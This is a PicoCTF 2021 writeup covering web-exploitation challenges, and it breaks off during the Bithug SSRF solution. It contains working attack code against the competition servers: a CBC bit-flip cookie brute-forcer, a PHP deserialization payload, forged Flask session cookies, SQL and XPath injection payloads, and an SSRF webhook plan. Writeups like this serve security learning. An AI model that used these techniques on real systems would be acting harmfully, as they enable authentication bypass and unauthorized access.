---
description: Writeups for PicoCTF 2021 Challenges
---

# PicoCTF 2021

## Web Exploit

Here are the web challenges that I completed in PicoCTF 2021

### Get aHEAD <a id="getahead"></a>

**Description:** Find the flag being held on this server to get ahead of the competition

**Points:** 20

#### **Solution**

The title of the challenge is interesting, the first instinct is that there is something hidden in the headers but let's look at Hints

{% hint style="info" %}
**Hint 1:** Maybe you have more than 2 choices
{% endhint %}

Let's look at the HTML code for this

```markup
				<div class="col-md-6">
					<div class="panel panel-primary" style="margin-top:50px">
						<div class="panel-heading">
							<h3 class="panel-title" style="color:red">Red</h3>
						</div>
						<div class="panel-body">
							<form action="index.php" method="GET">
								<input type="submit" value="Choose Red"/>
							</form>
						</div>
					</div>
				</div>
				<div class="col-md-6">
					<div class="panel panel-primary" style="margin-top:50px">
						<div class="panel-heading">
							<h3 class="panel-title" style="color:blue">Blue</h3>
						</div>
						<div class="panel-body">
							<form action="index.php" method="POST">
								<input type="submit" value="Choose Blue"/>
							</form>
						</div>
					</div>
				</div>
```

You can see there are two different methods used. "GET" and "POST" so the hint is probably referring to a third method and we can see "HEAD" popping out in the title. Let's try a "HEAD" request.

```bash
 curl -I HEAD -i http://mercury.picoctf.net:53554/index.php
```

The above curl request returns the flag as expected.

**Flag:** picoCTF{r3j3ct\_th3\_du4l1ty\_2e5ba39f}

### Cookies

**Description:** Who doesn't love cookies? Try to figure out the best one.

**Points:** 40

#### **Solution**

The challenge name is "Cookies" so let's look at cookies.

The cookie set is `name=-1` , let's try changing it to 1

![](../.gitbook/assets/image.png)

There is a change in the page, So we just need to find the right cookie. Using Brute force manually at I `name=18` found the flag.

**Flag:** picoCTF{3v3ry1\_l0v3s\_c00k135\_88acab36}

### Scavenger Hunt

**Description:** There is some interesting information hidden around this site. Can you find it?

**Points:** 50

#### **Solution**

By inspecting the source code I noticed this

```markup
      <div id="tababout" class="tabcontent">
		<h3>What</h3>
		<p>I used these to make this site: <br/>
		  HTML <br/>
		  CSS <br/>
		  JS (JavaScript)
		</p>
	<!-- Here's the first part of the flag: picoCTF{t -->
      </div>
```

Inspecting the CSS I noticed 

```text
/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
```

Assuming I will find something in the JS file too, I found `/* How can I keep Google from indexing my website? */` After a quick google search, I figured it's **robots.txt** where I found 3rd part and a hint 

```text
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
```

Working a lot with apache servers in the good 'ol days, I know it has to be **.htaccess**. Surpise, Surprise

```text
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
```

I know Mac creates hidden files like `.DS_Store` so let's look for that

```text
Congrats! You completed the scavenger hunt. Part 5: _a69684fd}
```

Awesome!!

**Flag:** picoCTF{th4ts\_4\_l0t\_0f\_pl4c3s\_2\_lO0k\_a69684fd}

### Some Assembly Required 1

**Points:** 70

#### **Solution**

Judging by the title it probably has something to do with Assembly language, Since it's a web challenge. It's probably Web Assembly, Let's see if there is a WASM file imported.

```text
    i32.load offset=12
    local.set $var5
    local.get $var4
    i32.load offset=8
    local.set $var6
    local.get $var6
    local.get $var5
    i32.store8 offset=1072
    return
  )
  (data (i32.const 1024) "picoCTF{a2843c6ba4157dc1bc052818a6242c3f}\00\00")
)
```

There is and it also has the flag.

**Flag:** picoCTF{a2843c6ba4157dc1bc052818a6242c3f}

### More Cookies

**Description:** I forgot Cookies can Be modified Client-side, so now I decided to encrypt them!

**Points:** 90

#### **Solution**

Looking at the website, This is a continuation of the "Cookies" challenge. So let's have a look

This time the page reads "Welcome to my cookie search page. Only the admin can use it!" and the cookie is

```text
auth_name=UXVDRDhEMmNrbTFCV25jbzdheFBjbHNmOWErZnNJdnY5Nk5pUkVNTkVXYUdRK0FVSk9tTGtRT3h1a0dWSDJrbmNHSUxsRTlNR2FZZFJaZ3RRb09EdngyUnd6L3FlbCtPSmZjbnJUVE5pWnVVUHNDQ1lJdFkzbTI4N29NWWxBRU4=
```

It's a base64 but when I decode it, it's still in gibberish, So it's encrypted. Let's see the Hint

{% hint style="info" %}
**Hint 1:** https://en.wikipedia.org/wiki/Homomorphic\_encryption
{% endhint %}

It's a Wikipedia page for a very interesting encryption method, It's more like an algorithm than an encryption formula. I found this to be the hardest challenge in the web,  Reading articles about Homomorphic encryption and looking at other writeups I understand that we do not have to decrypt it to solve it, Homomorphic encryption allows you to perform operations on encrypted text. Also, I noticed that the letters "CBC" are oddly capitalized in the challenge description. So, It's a CBC bitflip. Meaning the encrypted text contains a bit that determines if it's admin or not, so probably something like `admin=0` but I don't know it's position so I brute forced it, Here's the code

```python
from base64 import b64decode
from base64 import b64encode
import requests

def bitFlip( pos, bit, data):
    raw = b64decode(data)

    list1 = list(raw)
    list1[pos] = chr(ord(list1[pos])^bit)
    raw = ''.join(list1)
    return b64encode(raw)

ck = "UXVDRDhEMmNrbTFCV25jbzdheFBjbHNmOWErZnNJdnY5Nk5pUkVNTkVXYUdRK0FVSk9tTGtRT3h1a0dWSDJrbmNHSUxsRTlNR2FZZFJaZ3RRb09EdngyUnd6L3FlbCtPSmZjbnJUVE5pWnVVUHNDQ1lJdFkzbTI4N29NWWxBRU4="

for i in range(128):
  for j in range(128):
    c = bitFlip(i, j, ck)
    cookies = {'auth_name': c}
    r = requests.get('http://mercury.picoctf.net:25992/', cookies=cookies)
    if "picoCTF{" in r.text:
      print(r.text)
      break
```

**Flag:**  picoCTF{cO0ki3s\_yum\_82f39377}

### Who are you?

**Description:** Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn

**Points:** 100

#### **Solution**

**Stage 1:**

![](../.gitbook/assets/image%20%283%29.png)

This is the only thing I see on the website, Let's look at the hints

{% hint style="info" %}
**Hint 1:** It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616
{% endhint %}

So, I have to set special headers for this, After looking through [**Mozilla HTTP Header Docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) ****I found a header `User-Agent` which contains information regarding the browser, So I set it to **"picobrowser"**

**Stage 2:**

![](../.gitbook/assets/image%20%285%29.png)

After changing the header related to the browser, This is what I see. After looking through headers that relate to information regarding the previous site. I found `Referer` I changed it to the same URL.

`Referer: http://mercury.picoctf.net:39114/`

**Stage 3:**

![](../.gitbook/assets/image%20%287%29.png)

After passing the previous stage, Now I see this. It is asking us to visit it from 2018. I know that there is a header for **"Date"**, so I changed it to a date back in 2018.

`Date: Date: Fri, 1 Dec 2018` 

**Stage 4:**

![](../.gitbook/assets/image%20%284%29.png)

This time I need to set a header for "Do Not Track" which is `DNT`  
`DNT: 1`

**Stage 5:**

![](../.gitbook/assets/image%20%282%29.png)

This time, We need to access this from Sweden, My first instinct was VPN but so far we only used Headers to reach here. So I looked for another header that may reveal about location, I found `X-Forwarded-For` I changed it to the first IP I found on googling "Sweden IP address"

`X-Forwarded-For: 83.254.0.167`  

**Stage 6:**

![](../.gitbook/assets/image%20%2810%29.png)

This is an easy one, I need to change the `Accept-Language` header, I set it to `sv-en` 

`Accept-Language: sv-en` 

**Result:**

![](../.gitbook/assets/image%20%289%29.png)

Finally, we have our flag!

**Flag:** picoCTF{http\_h34d3rs\_v3ry\_c0Ol\_much\_w0w\_20ace0e4}

### Some Assembly Required 2

**Points:** 110

#### **Solution**

Like the "Some Assembly Required 1" challenge this is also related to Web Assembly. I opened the imported WASM file in Chrome Developer Tools and here's what I found towards the end \(Place where I found the flag for 1st part\)

```text
    end $label0
    local.get $var4
    i32.load offset=12
    local.set $var9
    local.get $var4
    i32.load offset=8
    local.set $var10
    local.get $var10
    local.get $var9
    i32.store8 offset=1072
    return
  )
  (data (i32.const 1024) "xakgK\5cNsmn;j8j<9;<?=l?k88mm1n9i1j>:8k?l0u\00\00")
)
```

> xakgK\5cNsmn;j8j&lt;9;&lt;?=l?k88mm1n9i1j&gt;:8k?l0u\00\00

This looks like it's encrypted, To figure out the encryption, I used **this website**. It tries all standard XOR decryptions at once. Using `XOR({'option':'Hex','string':'8'},'Standard',false)` the encrypted text outputs: `picoCTF{ef3b0b413475d7c00ee9f1a9b620c7d8}T88T88` , Great!

**Flag:** picoCTF{ef3b0b413475d7c00ee9f1a9b620c7d8}

### Super Serial

**Description:** Try to recover the flag stored on this website

**Points:** 130

#### **Solution**

As soon as you open the website you're prompted with a login screen. There isn't much to see on the login page. Let's have a look at the Hint

{% hint style="info" %}
**Hint 1:** The flag is at ../flag
{% endhint %}

So we need to figure out a way to read that file, I tried to brute force for other pages on the URL and found `/robots.txt` 

```text
User-agent: *
Disallow: /admin.phps
```

Notice "admin.**phps**". That is interesting, I tried the same extension for index.phps and it revealed the source code. Here's the PHP code for index.php

```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

As expected from the name it's a deserialization exploit \(see line 10\). Here we can also see two more files. `cookie.php` and `authentication.php` let's look at authentication.phps first.

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

Here you can see that class `access_log` contains an interesting function called `__toString()` this is a well known exploit. If you are able to echo the class `access_log` with a file, you can read its contents. So we need to pass the `../flag` into the `access_log()` and find a place where it's echoed. Let's look at our last file `cookie.php`

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

```

 Here's what I found towards the end. It was what we wanted. `$perm` is unserializing the cookie and is echoed \(`die("Deserialization error. ".$perm);`\) when the functions `is_guest()` and `is_admin()` are not found. So we need to pass `access_log("../flag")` to it. 

First, let's serialize and encode it in base64 so it gives the expected output on `unserialize(base64_decode(urldecode()))` 

Here's our exploit

```php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

$pwn = new access_log("../flag");

echo urlencode(base64_encode(serialize($pwn)));

// Output: TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

The `cookie.php` reads from the cookie `login` so we will set our exploit as

```text
login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

Now let's go to `authentication.php` where the `access_log` class exists.  


![](../.gitbook/assets/image%20%281%29.png)

There you go!

**Flag:** picoCTF{th15\_vu1n\_1s\_5up3r\_53r1ous\_y4ll\_66832978}

### Most Cookies

**Description:** Alright, enough of using my own encryption. Flask session cookies should be plenty secure! 

**Points:** 150

#### **Solution**

This is a similar problem to the first two "Cookie" problems. You'll need to set the right cookie to get the flag. This time we are provided with a source code file. Let's have a look

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()


```

You can see the `flag()` function for the display endpoint. It reads the `very_auth` cookie and checks if it is "admin" if yes, then it will show us the flag. Flask cookies use JWT to created a signed token we need to find the secret. From the above source code we can see from lines 6 and 7 that the secret is a random word from `cookie_names` list. If we can figure out which one is it then we can create a signed token for `very_auth=admin` 

I found a python library called ****[**flask-unsign**](https://github.com/Paradoxis/Flask-Unsign) ****which has useful tools to decrypt the cookie and also brute-force for the secret. First, let us decrypt the cookie `session` set by the server using

```python
$ flask-unsign --decode --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YG7ogw.sUaN7zHrEh4nQUr7qe7JfcFeynY
# Output
# {'very_auth': 'blank'}
```

We can use this token to brute force for secret from the word list provided using a `flask-unsign` and a text file \(cookies.txt\) consisting of the words from the list `cookie_name` Then we can use the following command to find the secret from the list.

```python
$ flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YG7ogw.sUaN7zHrEh4nQUr7qe7JfcFeynY --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attempts
'kiss'
```

`kiss` is our secret, Now I can just use the `flask-unsign` module to create a signed token for `{'very_auth': 'admin'}`

```python
$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'kiss'
# eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YG7s5w.Mdj-rfqsZ4fIPLiC27Nc3WQ7mUw
```

Let's change the cookie value of `session` to our generated token.

![](../.gitbook/assets/image%20%288%29.png)

**Flag:** picoCTF{pwn\_4ll\_th3\_cook1E5\_478da04c}

### Web Gauntlet 2

**Description:** This website looks familiar... Log in as admin Site: ... Filter: ...

**Points:** 170

#### **Solution**

This challenge is apparently a continuation of the "Web Gauntlet" challenge. Here, we are provided with two URLs one for login and another is for filters. Login is the page you'll need to exploit and bypass the form and gain access. "Filters" shows the list of keywords that are not allowed in the injection. Let's have a look at filters:

> Filters: or and true false union like = &gt; &lt; ; -- /\* \*/ admin

We can not use the above keywords in our injection. As mentioned on the login page. The server uses SQLite for the database. Here our username should be "admin" but we cannot use it due to filters so we need to find a way to enter the `username=admin` without spelling it.

**The query for username:**

We can use the "[CONCAT Operator](https://www.sqlitetutorial.net/sqlite-string-functions/sqlite-concat/)" which is `||` using this operator we can concatenate strings, For example: `'Pico'||'CTF'` will give us `'PicoCTF'` 

We can use this for "admin": `'a'||'dmin'`

**The query for the password:**

This is a tricky one because the filters pretty much block all mainstream operators like `=><` and we can't even comment out the rest of the query because `;/**/` are blocked too. But SQLite has several interesting operators apart from these that can be used for boolean expressions. One such operator is "GLOB" which is similar to the "LIKE" operator in MySQL. The query `password GLOB '*'` means that "a password with at least length one, which should return true, But in our case, we can't change the characters before query as in the query already has `password = '` we can not get rid of the `= '` 

Here's where we'll use a dirty trick. We can use an invalid expression that always returns true for everything: `column='' GLOB '*'` this statement isn't technically invalid but returns true. Let's understand it with a better example.

Consider this, the query `SELECT * FROM table WHERE name = "Jake" = False` is same as `SELECT * FROM table WHERE name != "Jake"` which means the second `=` actually returns True/False value of the first one. 

The query `SELECT * FROM table WHERE name = "Jake"` has two objects one where the rows meet the condition \(True\) and the other where the rows do not meet the condition \(False\). So our query `password = '' GLOB '*'` basically translates to 'return True and False rows for `password=''` which is always True

**Final Injection**

**Username:** `a'||'dmin`  
**Password:** `'GLOB'*` ****

  
**Final Query**

```sql
SELECT username, password FROM users WHERE username='a'||'dmin' AND password=''GLOB'*'
```

The character limit is 35 but our password is just 7 characters long! Let's enter it into the login page

![](../.gitbook/assets/image%20%2816%29.png)

**Flag:** picoCTF{0n3\_m0r3\_t1m3\_fc0f841ee8e0d3e1f479f1a01a617ebb}

### X marks the spot

**Description:** Another login you have to bypass. Maybe you can find an injection that works?

**Points:** 250

#### **Solution**

The link takes you to a login screen that reads "Only I know the password, and I don't use any of those regular old unsafe query languages!" Let's look at the hint.

{% hint style="info" %}
**Hint 1:** XPATH
{% endhint %}

So, this is an XPath injection. This is not like any of the injections before. I tried bypassing the login with always true queries but they do not work, However, There is an interesting message that pops up when I enter an always true booleans like `' or 1=1 or 'a` 

![](../.gitbook/assets/image%20%2814%29.png)

It says "You're on the right path." I tried to change things a little bit and used a false query like `' and 1=2 and 'a'='a` 

![](../.gitbook/assets/image%20%2817%29.png)

Now it says "Login failure." This means that it's a Blind XPATH injection which means we have to figure out the username and password using queries. Here we can use **"starts-wth\(\)"** operator. Which returns true if the passed characters are at the beginninng of a document. We do not know the column names yet so we can use `//*` which basically means check for all documents \(columns\). I tried testing it with `' or //*[starts-with(text(),'a')] or 'a'='b` which interestingly enough returned true. I tried again with `' or //*[starts-with(text(),'ab')] or 'a'='b` which returned false. 

We can actually write a script that runs through all the combinations and stacks the successful characters upon success. Here's the Python script that I made

```python
import requests
from string import *

charecters = ascii_lowercase + ascii_uppercase + digits+"}_"
print(charecters)

seen_password = ["picoCTF{"]
while True:

    for ch in charecters:
        print(f"trying {''.join(seen_password)+ch}")
        st = ''.join(seen_password)+ch
        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{st}')] or '1'='"}
        r = requests.post("http://mercury.picoctf.net:59946/", data=data)

        content = r.text
        if "You&#39;re on the right path." in content:
            seen_password.append(ch)
            break
```

I tried running the above script several times before which returned with values like admin, bob, thisisnottheflag then I figured that we are supposed to look for the flag itself not some password. so I started with the standard starting format `picoCTF{` after running for a while, I finaly got the full flag.

**Flag:** picoCTF{h0p3fully\_u\_t0ok\_th3\_r1ght\_xp4th\_a56016ef}

### Web Gauntlet 3

**Description:** Last time, I promise! Only 25 characters this time. Log in as admin

**Points:** 300

#### **Solution**

This is the same challenge as the "Web Gauntlet 2" but this time we are only allowed to use 25 characters for our injection. We can solve this using the exact same injection because last time our query was only 7 characters.

**Username:** `a'||'dmin`  
**Password:** `'GLOB'*` ****

![](../.gitbook/assets/image%20%2818%29.png)

**Flag:** picoCTF{k3ep\_1t\_sh0rt\_30593712914d76105748604617f4006a}

### Bithug

**Description:** Code management software is way too bloated. Try our new lightweight solution, BitHug.

**Points:** 500

#### **Solution**

This is the last challenge of Web Exploit and also has the highest points in the web section. Here we are also given source code. 

This is basically a clone of GitHub it has features like webhooks, collaborators, etc. The flag is hidden at `_/<username>.git` but we do not have access to read it. So we need to figure out a way to gain read access to the repo.

Let's go through the source code, Here's an interesting thing I found in `auth-api.ts` 

```typescript
    const sourceIp = req.socket.remoteAddress;
    if (sourceIp === "127.0.0.1" || sourceIp === "::1" || sourceIp === "::ffff:127.0.0.1") {
        req.user = { kind: "admin" };
        return next();
    }

    req.user = { kind: "none" };
    return next();
```

You notice that requests from localhost \(127.0.0.1\) are given admin access and all endpoints from `git-api.ts` can be freely accessed by admins.

The server has a webhook feature that we can use to send a request from the server to the server itself \(SSRF\). But this way we can't really read any data because there is no way to echo the data back from the endpoint that was accessed by web-hook.

However there is one thing we could do here, We can add ourselves as a collaborator to `_/<username>.git` since admin has rights to all the endpoints we can send a request to git upload endpoint `/:user/:repo.git/git-upload-pack` which is responsible for updating the repo on git.

**The Plan**

1. Create a payload for adding a collaborator to a repository
2. Create a webhook that sends a POST request to `_127.0.0.1:1823/<username>.git/git-upload-pack` 
3. Use this payload to push to `_/<username>.git` using webhook

Notice, we need to send this to that 1823 port because that's where the server is actually running locally. You can find this from the Dockerfile provided.

**Step 1**

Let us create a user with username: "abbas" and password: "abbas" on bithug. Now, create a repository named "abbas". We will clone this repository locally using 

```bash
git clone http://abbas@venus.picoctf.net:49771/abbas/abbas.git
```

Now, we'll need to add a collaborator, we can find instructions on the repository page

![](../.gitbook/assets/image%20%2819%29.png)

Let us add a collaborator using

```bash
$ git checkout --orphan newbranch
$ echo "abbas" > access.conf
$ git add access.conf
$ git commit -m "Added a user to the repo"
```

Do not push it yet, we need to capture this request. I am going to use [Wireshark ](https://www.wireshark.org/)for this. After starting "capture" on Wireshark, `git push origin @:refs/meta/config`  


![](../.gitbook/assets/image%20%2812%29.png)

Here is the `http` stream from Wireshark, You'll notice that there is a `POST` request. That's what we need.

![](../.gitbook/assets/image%20%2815%29.png)

Highlighted is the data we need, let us copy it in the Hex string format which should look like this

```text
"\x30\x30\x39\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x61\x32\x31\x32\x39\x39\x38\x61\x35\x65\x63\x32\x36\x37\x31\x35\x37\x61\x33\x39\x62\x64\x62\x37\x39\x30\x64\x33\x30\x33\x30\x39\x34\x38\x32\x65\x35\x31\x34\x32\x20\x72\x65\x66\x73\x2f\x6d\x65\x74\x61\x2f\x63\x6f\x6e\x66\x69\x67\x00\x20\x72\x65\x70\x6f\x72\x74\x2d\x73\x74\x61\x74\x75\x73\x20\x73\x69\x64\x65\x2d\x62\x61\x6e\x64\x2d\x36\x34\x6b\x20\x61\x67\x65\x6e\x74\x3d\x67\x69\x74\x2f\x32\x2e\x32\x35\x2e\x31\x30\x30\x30\x30\x50\x41\x43\x4b\x00\x00\x00\x02\x00\x00\x00\x03\x9b\x0c\x78\x9c\xa5\xcc\x41\x0a\xc2\x30\x10\x40\xd1\x7d\x4e\x31\x7b\x51\x32\x93\xc6\xb6\x20\xa2\xa8\x0b\x2d\xa8\xa0\x17\x48\x9b\x29\x2d\xb4\x8e\xc4\xe9\xfd\xad\x67\x70\xf3\x17\x7f\xf1\x34\x31\x03\x65\x8e\x1a\xcc\x0b\x8a\x31\xf7\x59\x41\xd4\xd6\xe4\x83\x2d\x33\xf2\x6d\x64\x6c\x69\x7e\xd6\xd5\xa5\x09\x93\x76\x92\x20\x89\x28\x6c\x7e\xdd\x1d\x4f\x8f\xea\x79\xbb\x2f\xaf\x87\x73\x75\x41\xb7\x1a\xa4\x09\x43\x94\x31\xf4\xaf\x2d\xe0\x1a\xf3\xd2\x7a\x24\x84\x85\xf5\xce\x9a\x46\xc6\xb1\x57\xe5\x3f\x08\xb3\x8f\x91\x23\x04\x98\x3e\x33\xa3\x02\xda\x31\x24\x7e\x8b\xf9\x02\xc2\xda\x3c\x04\xa7\x02\x78\x9c\x33\x34\x30\x30\x33\x31\x51\x48\x4c\x4e\x4e\x2d\x2e\xd6\x4b\xce\xcf\x4b\x63\xf8\x1c\x5b\xcb\xe7\xce\xf0\xfb\x6d\x65\xac\xeb\xc3\x59\x2b\x97\x33\x3e\x33\xf3\xb8\x0f\x00\x0b\xd6\x0f\xca\x36\x78\x9c\x4b\x4c\x4a\x4a\x2c\xe6\x02\x00\x07\xd1\x02\x04\x30\x9a\x4e\xdf\x99\x0e\xe6\x14\xcf\xdf\xbf\x9f\x2b\x17\xad\x88\x60\x16\x21\x12"
```

Now we need to get this to the webhook body, If you look at this part of the source code:

```typescript
router.get("/:user/:repo.git/webhooks", async (req, res) => {
    if (req.user.kind === "admin" || req.user.kind === "none") {
        return res.send({ webhooks: [] });
    }
    const webhooks = await webhookManager.getWebhooksForUser(req.git.repo, req.user.user);
    return res.send(webhooks.map(
        (webhook): SerializedWebhook => ({ ...webhook, body: webhook.body.toString("base64") }))
    );
});
```

You'll notice that the body of the webhook is encoded in base64. So let's do that using a simple python script.

```python
import base64

hex_string = b"\x30\x30\x39\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x61\x32\x31\x32\x39\x39\x38\x61\x35\x65\x63\x32\x36\x37\x31\x35\x37\x61\x33\x39\x62\x64\x62\x37\x39\x30\x64\x33\x30\x33\x30\x39\x34\x38\x32\x65\x35\x31\x34\x32\x20\x72\x65\x66\x73\x2f\x6d\x65\x74\x61\x2f\x63\x6f\x6e\x66\x69\x67\x00\x20\x72\x65\x70\x6f\x72\x74\x2d\x73\x74\x61\x74\x75\x73\x20\x73\x69\x64\x65\x2d\x62\x61\x6e\x64\x2d\x36\x34\x6b\x20\x61\x67\x65\x6e\x74\x3d\x67\x69\x74\x2f\x32\x2e\x32\x35\x2e\x31\x30\x30\x30\x30\x50\x41\x43\x4b\x00\x00\x00\x02\x00\x00\x00\x03\x9b\x0c\x78\x9c\xa5\xcc\x41\x0a\xc2\x30\x10\x40\xd1\x7d\x4e\x31\x7b\x51\x32\x93\xc6\xb6\x20\xa2\xa8\x0b\x2d\xa8\xa0\x17\x48\x9b\x29\x2d\xb4\x8e\xc4\xe9\xfd\xad\x67\x70\xf3\x17\x7f\xf1\x34\x31\x03\x65\x8e\x1a\xcc\x0b\x8a\x31\xf7\x59\x41\xd4\xd6\xe4\x83\x2d\x33\xf2\x6d\x64\x6c\x69\x7e\xd6\xd5\xa5\x09\x93\x76\x92\x20\x89\x28\x6c\x7e\xdd\x1d\x4f\x8f\xea\x79\xbb\x2f\xaf\x87\x73\x75\x41\xb7\x1a\xa4\x09\x43\x94\x31\xf4\xaf\x2d\xe0\x1a\xf3\xd2\x7a\x24\x84\x85\xf5\xce\x9a\x46\xc6\xb1\x57\xe5\x3f\x08\xb3\x8f\x91\x23\x04\x98\x3e\x33\xa3\x02\xda\x31\x24\x7e\x8b\xf9\x02\xc2\xda\x3c\x04\xa7\x02\x78\x9c\x33\x34\x30\x30\x33\x31\x51\x48\x4c\x4e\x4e\x2d\x2e\xd6\x4b\xce\xcf\x4b\x63\xf8\x1c\x5b\xcb\xe7\xce\xf0\xfb\x6d\x65\xac\xeb\xc3\x59\x2b\x97\x33\x3e\x33\xf3\xb8\x0f\x00\x0b\xd6\x0f\xca\x36\x78\x9c\x4b\x4c\x4a\x4a\x2c\xe6\x02\x00\x07\xd1\x02\x04\x30\x9a\x4e\xdf\x99\x0e\xe6\x14\xcf\xdf\xbf\x9f\x2b\x17\xad\x88\x60\x16\x21\x12"
print(base64.encodebytes(hex_string))
```

This will give us the body of our webhook, it should look like this

```text
MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==
```

**Step 2**

Now we need to create a webhook, let us create a sample webhook first in our `abbas` repository and see what requests are made.

```javascript
{
    "url": "http://google.com",
    "body": "ewogICAgImJyYW5jaCI6ICJ7e2JyYW5jaH19IiwKICAgICJ1c2VyIjogInt7dXNlcn19Igp9",
    "contentType": "application/json"
}
```

This is the format we need to use for creating our webhook. We already have the body and the `contentType` is `application/x-git-receive-pack-request` which you can find on your Wireshark request.

The URL is supposed to be `127.0.0.1:1823` but it's tricky due to this

```typescript
router.post("/:user/:repo.git/webhooks", async (req, res) => {
    if (req.user.kind === "admin" || req.user.kind === "none") {
        return res.status(400).end();
    }

    const { url, body, contentType } = req.body;
    const validationUrl = new URL(url);
    if (validationUrl.port !== "" && validationUrl.port !== "80") {
        throw new Error("Url must go to port 80");
    }
    if (validationUrl.host === "localhost" || validationUrl.host === "127.0.0.1") {
        throw new Error("Url must not go to localhost");
    }

    if (typeof contentType !== "string" || typeof body !== "string") {
        throw new Error("Bad arguments");
    }
    const trueBody = Buffer.from(body, "base64");

    await webhookManager.addWebhook(req.git.repo, req.user.user, url, contentType, trueBody);
    return res.send({});
});
```

There are filters in place that prevent us from adding 127.0.0.1 as host and a port that's not 80. I solved this by hosting a flask app that redirects all the traffic to `http://127.0.0.1:1823/_/abbas.git/git-receive-pack` here is the code for that

```python
